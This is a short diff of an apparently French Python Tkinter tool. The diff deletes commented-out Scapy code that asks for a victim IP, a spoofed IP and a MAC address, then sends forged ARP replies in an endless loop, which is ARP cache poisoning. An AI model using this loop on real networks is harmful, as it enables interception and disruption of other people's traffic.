@@ -48,20 +48,3 @@ Button(master, text='Quitter', command=master.destroy).grid(row=3, column=1, sti
 
 #fin de la fenetre
 master.mainloop()
-
-#demande les informations
-#op=1 #envoie un packet a la fois
-#victim = raw_input("Entrez l'adresse IP de la victime: ") #demande IP de la victime
-#spoof = raw_input("Entrez l'adresse IP a usurper: ") #demande IP a usurper
-#mac = raw_input("Entrez l'adresse MAC a associer: ") #demande MAC a envoyer a la victime
-
-#lance larp poisonning
-#arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
-
-#boucle
-#while 1:
-	#send(arp) #
-	#time.sleep(2) #
-	
-#show_entry_fields():
-   #print("Entrez l'adresse IP de la victime:  %s\nEntrez l'adresse IP a usurper: %s\nEntrez l adresse MAC a associer: %s" % (victim.get(), spoof.get(),mac.get()))
